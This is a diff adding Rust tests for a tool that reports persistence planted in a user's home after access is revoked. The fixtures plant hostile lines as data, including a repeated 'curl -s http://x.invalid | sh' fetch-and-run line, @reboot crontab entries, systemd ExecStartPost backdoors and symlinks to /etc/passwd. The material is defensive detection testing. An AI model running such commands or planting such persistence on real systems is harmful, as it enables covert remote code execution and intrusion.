@@ -1,0 +1,514 @@
+//! D356: grant-time records and revoke-time reports of access files, with
+//! J322's planted cases (#355 82768): a reboot, a retargeted symlinked
+//! startup file, an edited unit target, a big file, a file flood, and a
+//! rootless forgery.
+use super::*;
+
+/// A fake account whose home is a fresh private directory.
+fn account() -> (User, PathBuf) {
+    let mut user = User::from_uid(nix::unistd::Uid::effective())
+        .unwrap()
+        .unwrap();
+    let home = nix::unistd::mkdtemp("/tmp/af-XXXXXX").unwrap();
+    user.dir.clone_from(&home);
+    (user, home)
+}
+
+/// No host spool sources, so a test reads only files beneath the fake home.
+fn no_extra(_: &User, _: &mut dyn FnMut(String, io::Result<Vec<u8>>)) {}
+
+/// The account itself for its uid, as the host's user database would.
+fn lookup(user: &User) -> impl Fn(u32) -> Option<User> + '_ {
+    move |uid| (uid == user.uid.as_raw()).then(|| user.clone())
+}
+
+/// Records a grant for a new person, then reports since it (root rules).
+struct Granted {
+    user: User,
+    home: PathBuf,
+    store: PathBuf,
+    person: uuid::Uuid,
+}
+impl Granted {
+    /// Grants a new person on a fresh account after `setup` ran in its home.
+    fn new(setup: impl FnOnce(&Path), extra: &Extra) -> Self {
+        let (user, home) = account();
+        setup(&home);
+        let store = home.join(".test-store");
+        let person = uuid::Uuid::new_v4();
+        record_grant(&store, person, &user, extra).unwrap();
+        Self {
+            user,
+            home,
+            store,
+            person,
+        }
+    }
+    /// The report a root agent gives on revoke, with no live login known
+    /// (as after a reboot).
+    fn report(&self, extra: &Extra) -> Access {
+        since_grant(
+            &self.store,
+            self.person,
+            &[],
+            &lookup(&self.user),
+            extra,
+            false,
+        )
+    }
+    /// The one account's changed files.
+    fn files(&self, extra: &Extra) -> Vec<Change> {
+        let access = self.report(extra);
+        assert_eq!(access.accounts.len(), 1, "{access:?}");
+        access.accounts[0].files.clone()
+    }
+}
+impl Drop for Granted {
+    fn drop(&mut self) {
+        let _ = std::fs::remove_dir_all(&self.home);
+    }
+}
+
+/// A key appended to `authorized_keys` and a new autostart entry are
+/// reported with exactly their new lines; untouched files are not; before
+/// any change the account reads "checked, unchanged".
+#[test]
+fn new_access_lines_since_the_grant_are_reported_exactly() {
+    let granted = Granted::new(
+        |home| {
+            std::fs::create_dir_all(home.join(".ssh")).unwrap();
+            std::fs::write(
+                home.join(".ssh/authorized_keys"),
+                "ssh-ed25519 AAAAold owner\n",
+            )
+            .unwrap();
+            std::fs::write(home.join(".bashrc"), "export PATH=$PATH:~/bin\n").unwrap();
+        },
+        &no_extra,
+    );
+    let clean = granted.report(&no_extra);
+    assert_eq!(clean.state, State::Unchanged, "{clean:?}");
+    assert_eq!(clean.accounts[0].state, State::Unchanged);
+    let home = &granted.home;
+    std::fs::write(
+        home.join(".ssh/authorized_keys"),
+        "ssh-ed25519 AAAAold owner\nssh-ed25519 AAAAnew left-behind\n",
+    )
+    .unwrap();
+    std::fs::create_dir_all(home.join(".config/autostart")).unwrap();
+    std::fs::write(
+        home.join(".config/autostart/back.desktop"),
+        "[Desktop Entry]\nExec=/tmp/back\n",
+    )
+    .unwrap();
+    let access = granted.report(&no_extra);
+    assert_eq!(access.state, State::Changed);
+    assert_eq!(
+        access.accounts[0].files,
+        [
+            Change {
+                path: "~/.ssh/authorized_keys".into(),
+                change: ChangeKind::Changed,
+                lines: vec!["ssh-ed25519 AAAAnew left-behind".into()],
+                note: None
+            },
+            Change {
+                path: "~/.config/autostart/back.desktop".into(),
+                change: ChangeKind::Added,
+                lines: vec!["[Desktop Entry]".into(), "Exec=/tmp/back".into()],
+                note: None
+            },
+        ]
+    );
+    assert_eq!(access.accounts[0].account, granted.user.name);
+}
+
+/// J322 P1: a reboot empties `/run`, so the revoke knows no live login; the
+/// accounts come from the persistent record store and the plant is reported.
+#[test]
+fn a_revoke_after_a_reboot_still_reports_the_plant() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    std::fs::create_dir_all(granted.home.join(".ssh")).unwrap();
+    std::fs::write(
+        granted.home.join(".ssh/authorized_keys"),
+        "ssh-ed25519 AAAAreboot left-behind\n",
+    )
+    .unwrap();
+    let access = granted.report(&no_extra);
+    assert_eq!(access.state, State::Changed, "{access:?}");
+    assert_eq!(
+        access.accounts[0].files[0].lines,
+        ["ssh-ed25519 AAAAreboot left-behind"]
+    );
+}
+
+/// J322 P2: a symlinked startup file (home-manager style) retargeted to a
+/// file in the home is reported as a retarget, and the new target's lines
+/// are shown; nothing outside the home is followed.
+#[test]
+fn a_retargeted_symlinked_startup_file_is_reported() {
+    let granted = Granted::new(
+        |home| std::os::unix::fs::symlink("/etc/skel/.bashrc", home.join(".bashrc")).unwrap(),
+        &no_extra,
+    );
+    std::fs::remove_file(granted.home.join(".bashrc")).unwrap();
+    std::fs::write(
+        granted.home.join(".evilrc"),
+        "curl -s http://x.invalid | sh\n",
+    )
+    .unwrap();
+    std::os::unix::fs::symlink(".evilrc", granted.home.join(".bashrc")).unwrap();
+    let files = granted.files(&no_extra);
+    let bashrc = files.iter().find(|f| f.path == "~/.bashrc").unwrap();
+    assert_eq!(bashrc.change, ChangeKind::Changed);
+    assert!(
+        bashrc
+            .note
+            .as_deref()
+            .is_some_and(|note| note.contains("now points to .evilrc (was /etc/skel/.bashrc)")),
+        "{bashrc:?}"
+    );
+    let target = files.iter().find(|f| f.path == "~/.evilrc").unwrap();
+    assert_eq!(target.lines, ["curl -s http://x.invalid | sh"]);
+}
+
+/// J322 P2: a unit linked into `~/.config/systemd/user` from elsewhere in
+/// the home is checked at its real file, so an added `ExecStartPost=` there
+/// is reported. A drop-in directory is read too.
+#[test]
+fn an_edited_unit_target_and_a_drop_in_are_reported() {
+    let granted = Granted::new(
+        |home| {
+            let share = home.join(".local/share/systemd/user");
+            std::fs::create_dir_all(&share).unwrap();
+            std::fs::write(
+                share.join("back.service"),
+                "[Service]\nExecStart=/bin/true\n",
+            )
+            .unwrap();
+            let units = home.join(".config/systemd/user");
+            std::fs::create_dir_all(&units).unwrap();
+            std::os::unix::fs::symlink(
+                home.join(".local/share/systemd/user/back.service"),
+                units.join("back.service"),
+            )
+            .unwrap();
+        },
+        &no_extra,
+    );
+    let home = &granted.home;
+    std::fs::write(
+        home.join(".local/share/systemd/user/back.service"),
+        "[Service]\nExecStart=/bin/true\nExecStartPost=/tmp/evil\n",
+    )
+    .unwrap();
+    let dropin = home.join(".config/systemd/user/other.service.d");
+    std::fs::create_dir_all(&dropin).unwrap();
+    std::fs::write(
+        dropin.join("x.conf"),
+        "[Service]\nExecStartPre=/tmp/evil2\n",
+    )
+    .unwrap();
+    let files = granted.files(&no_extra);
+    let target = files
+        .iter()
+        .find(|f| f.path == "~/.local/share/systemd/user/back.service")
+        .unwrap_or_else(|| panic!("{files:?}"));
+    assert_eq!(target.lines, ["ExecStartPost=/tmp/evil"]);
+    let drop = files
+        .iter()
+        .find(|f| f.path == "~/.config/systemd/user/other.service.d/x.conf")
+        .unwrap_or_else(|| panic!("{files:?}"));
+    assert!(drop.lines.contains(&"ExecStartPre=/tmp/evil2".to_owned()));
+}
+
+/// J322 P2: a startup file already larger than the line limit at the grant,
+/// with a line appended later, is reported as changed with its size.
+#[test]
+fn a_big_file_changed_past_its_start_is_reported() {
+    let big = "# filler line\n".repeat(8 * 1024);
+    let granted = Granted::new(
+        |home| std::fs::write(home.join(".zlogin"), &big).unwrap(),
+        &no_extra,
+    );
+    std::fs::write(
+        granted.home.join(".zlogin"),
+        format!("{big}curl -s http://x.invalid | sh\n"),
+    )
+    .unwrap();
+    let files = granted.files(&no_extra);
+    assert_eq!(files.len(), 1, "{files:?}");
+    assert_eq!(files[0].path, "~/.zlogin");
+    assert_eq!(files[0].change, ChangeKind::Changed);
+    assert!(
+        files[0]
+            .note
+            .as_deref()
+            .is_some_and(|note| note.contains("too large to show lines")),
+        "{files:?}"
+    );
+}
+
+/// J322 P2: a rootless agent runs as the account, so a person can rewrite
+/// the record to match their plant. Rootless reports are never "unchanged":
+/// they read "not checked: unverified", with what was found as a hint.
+#[test]
+fn a_rootless_record_is_never_vouched_for() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    std::fs::write(
+        granted.home.join(".bashrc"),
+        "curl -s http://x.invalid | sh\n",
+    )
+    .unwrap();
+    // The forgery: the person records again over the grant, plant included.
+    let path = record_path(&granted.store, granted.person, granted.user.uid.as_raw());
+    std::fs::remove_file(&path).unwrap();
+    record_grant(&granted.store, granted.person, &granted.user, &no_extra).unwrap();
+    let access = since_grant(
+        &granted.store,
+        granted.person,
+        &[granted.user.uid.as_raw()],
+        &lookup(&granted.user),
+        &no_extra,
+        true,
+    );
+    assert_eq!(access.state, State::NotChecked);
+    assert_eq!(access.reason, Some(Reason::RootlessUnverified));
+    assert_eq!(access.accounts[0].reason, Some(Reason::RootlessUnverified));
+}
+
+/// No record says "not checked", never "unchanged": with a live login and
+/// no record, and with neither.
+#[test]
+fn a_missing_record_reads_not_checked() {
+    let (user, home) = account();
+    let store = home.join(".test-store");
+    let person = uuid::Uuid::new_v4();
+    let live = since_grant(
+        &store,
+        person,
+        &[user.uid.as_raw()],
+        &lookup(&user),
+        &no_extra,
+        false,
+    );
+    assert_eq!(live.state, State::NotChecked);
+    assert_eq!(live.accounts[0].reason, Some(Reason::RecordMissing));
+    assert_eq!(live.accounts[0].account, user.name);
+    let none = since_grant(&store, person, &[], &lookup(&user), &no_extra, false);
+    assert_eq!(none.state, State::NotChecked);
+    assert_eq!(none.reason, Some(Reason::RecordMissing));
+    assert!(none.accounts.is_empty());
+    std::fs::remove_dir_all(home).unwrap();
+}
+
+/// The record holds hashes, never lines (no secrets at rest), sits in a
+/// per-account directory, and is forgotten after the revocation.
+#[test]
+fn the_record_holds_no_content_and_is_forgotten() {
+    let granted = Granted::new(
+        |home| std::fs::write(home.join(".bashrc"), "export TOKEN=secret-canary\n").unwrap(),
+        &no_extra,
+    );
+    let path = record_path(&granted.store, granted.person, granted.user.uid.as_raw());
+    let saved = std::fs::read_to_string(&path).unwrap();
+    assert!(!saved.contains("secret-canary"), "the record stored a line");
+    assert!(path.starts_with(granted.store.join(granted.user.uid.as_raw().to_string())));
+    forget(&granted.store, granted.person).unwrap();
+    assert!(!path.exists());
+}
+
+/// A planted link is reported with its target and never read, at a file
+/// and at a directory (`~/.config/autostart` -> `/etc/xdg/autostart`).
+#[test]
+fn planted_links_are_reported_but_never_followed() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    std::os::unix::fs::symlink("/etc/passwd", granted.home.join(".profile")).unwrap();
+    std::fs::create_dir_all(granted.home.join(".config")).unwrap();
+    std::os::unix::fs::symlink("/etc/xdg/autostart", granted.home.join(".config/autostart"))
+        .unwrap();
+    let files = granted.files(&no_extra);
+    let notes: Vec<_> = files
+        .iter()
+        .map(|f| {
+            (
+                f.path.as_str(),
+                f.note.clone().unwrap_or_default(),
+                f.lines.len(),
+            )
+        })
+        .collect();
+    assert!(
+        notes.contains(&(
+            "~/.profile",
+            "a symbolic link to /etc/passwd; not followed".to_owned(),
+            0
+        )),
+        "{notes:?}"
+    );
+    assert!(
+        notes.contains(&(
+            "~/.config/autostart",
+            "a symbolic link to /etc/xdg/autostart; not followed".to_owned(),
+            0
+        )),
+        "{notes:?}"
+    );
+}
+
+/// Crontab lines and an `at` job's command are reported; the environment
+/// atd saved in the job (which can hold tokens) never is (J322 P3).
+#[test]
+fn crontab_lines_and_at_commands_are_reported_without_the_environment() {
+    let after = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let planted = after.clone();
+    let extra = move |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
+        let mut crontab = b"0 * * * * backup\n".to_vec();
+        if planted.load(std::sync::atomic::Ordering::SeqCst) {
+            crontab.extend_from_slice(b"@reboot /tmp/back\n");
+            visit(
+                "at job a0000101".into(),
+                Ok(b"#!/bin/sh\n# atrun uid=1000 gid=1000\numask 22\nGITHUB_TOKEN=token-canary; export GITHUB_TOKEN\ncd /home/x || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n/tmp/back --later\n".to_vec()),
+            );
+        }
+        visit("crontab".into(), Ok(crontab));
+    };
+    let granted = Granted::new(|_| {}, &extra);
+    after.store(true, std::sync::atomic::Ordering::SeqCst);
+    let files = granted.files(&extra);
+    let text = format!("{files:?}");
+    assert!(
+        !text.contains("token-canary"),
+        "an at job's environment was reported: {text}"
+    );
+    let crontab = files.iter().find(|f| f.path == "crontab").unwrap();
+    assert_eq!(crontab.lines, ["@reboot /tmp/back"]);
+    let job = files.iter().find(|f| f.path == "at job a0000101").unwrap();
+    assert_eq!(job.lines, ["/tmp/back --later"]);
+}
+
+/// A long line keeps its end, and says it was cut; a whitespace run that
+/// pushes a command out of sight is counted instead (J322 P3).
+#[test]
+fn a_cut_line_says_so_and_keeps_its_end() {
+    let hidden = format!("#{}; curl -s http://x.invalid | sh", " ".repeat(230));
+    assert_eq!(
+        shown(hidden.as_bytes()),
+        "#[230 spaces]; curl -s http://x.invalid | sh"
+    );
+    let long = format!("{}; curl -s http://x.invalid | sh", "x".repeat(500));
+    let cut = shown(long.as_bytes());
+    assert!(cut.contains("characters cut]"), "{cut}");
+    assert!(cut.ends_with("curl -s http://x.invalid | sh"), "{cut}");
+    assert!(shown(b"a\x1b[2Jb").contains('\u{fffd}'));
+}
+
+/// The report shows at most `REPORTED_LINES` lines and says when it held
+/// more back, without dropping the file.
+#[test]
+fn the_report_is_bounded_and_says_so() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    let many: String = (0..REPORTED_LINES * 2)
+        .map(|i| format!("alias a{i}=b\n"))
+        .collect();
+    std::fs::write(granted.home.join(".zshrc"), many).unwrap();
+    let access = granted.report(&no_extra);
+    let account = &access.accounts[0];
+    assert!(account.truncated);
+    assert_eq!(account.files[0].lines.len(), REPORTED_LINES);
+    assert!(
+        account.files[0]
+            .note
+            .as_deref()
+            .is_some_and(|note| note.contains("more new lines")),
+    );
+}
+
+/// J322 P2, the flood: 64 drop-in directories of 64 files of 64 KiB each.
+/// Run in a child so its peak memory is its own: it stays under 40 MB, the
+/// report says it is truncated and names what it did not scan, and the
+/// crontab (scanned before the unit directory) is still reported.
+#[test]
+fn a_file_flood_stays_bounded_and_keeps_the_crontab() {
+    let output = std::process::Command::new(std::env::current_exe().unwrap())
+        .args([
+            "--exact",
+            "access_files::tests::flood_probe",
+            "--ignored",
+            "--nocapture",
+            "--test-threads=1",
+        ])
+        .output()
+        .unwrap();
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(
+        output.status.success(),
+        "{stdout}{}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    let line = stdout
+        .lines()
+        .find(|line| line.starts_with("FLOOD "))
+        .unwrap_or_else(|| panic!("{stdout}"));
+    let peak_kb: u64 = line
+        .split_whitespace()
+        .find_map(|field| field.strip_prefix("peak_kb="))
+        .unwrap()
+        .parse()
+        .unwrap();
+    eprintln!("{line}");
+    assert!(peak_kb < 40 * 1024, "peak {peak_kb} kB");
+    assert!(line.contains("truncated=true"), "{line}");
+    assert!(line.contains("crontab_reported=true"), "{line}");
+    assert!(
+        line.contains("unscanned=") && !line.contains("unscanned=0 "),
+        "{line}"
+    );
+}
+
+/// Child of `a_file_flood_stays_bounded_and_keeps_the_crontab`.
+#[test]
+#[ignore = "child of a_file_flood_stays_bounded_and_keeps_the_crontab"]
+fn flood_probe() {
+    let after = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let planted = after.clone();
+    let extra = move |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
+        let mut crontab = b"0 * * * * backup\n".to_vec();
+        if planted.load(std::sync::atomic::Ordering::SeqCst) {
+            crontab.extend_from_slice(b"@reboot /tmp/back\n");
+        }
+        visit("crontab".into(), Ok(crontab));
+    };
+    let granted = Granted::new(|_| {}, &extra);
+    let chunk = "x".repeat(64 * 1024 - 1) + "\n";
+    for directory in 0..64 {
+        let path = granted
+            .home
+            .join(format!(".config/systemd/user/u{directory}.service.d"));
+        std::fs::create_dir_all(&path).unwrap();
+        for file in 0..64 {
+            std::fs::write(path.join(format!("f{file}.conf")), &chunk).unwrap();
+        }
+    }
+    after.store(true, std::sync::atomic::Ordering::SeqCst);
+    let access = granted.report(&extra);
+    let account = &access.accounts[0];
+    let crontab = account
+        .files
+        .iter()
+        .any(|f| f.path == "crontab" && f.lines == ["@reboot /tmp/back"]);
+    let status = std::fs::read_to_string("/proc/self/status").unwrap();
+    let peak = status
+        .lines()
+        .find_map(|line| line.strip_prefix("VmHWM:"))
+        .unwrap()
+        .trim()
+        .trim_end_matches(" kB")
+        .to_owned();
+    println!(
+        "FLOOD peak_kb={peak} truncated={} crontab_reported={crontab} unscanned={} files={}",
+        account.truncated,
+        account.unscanned.len(),
+        account.files.len()
+    );
+}
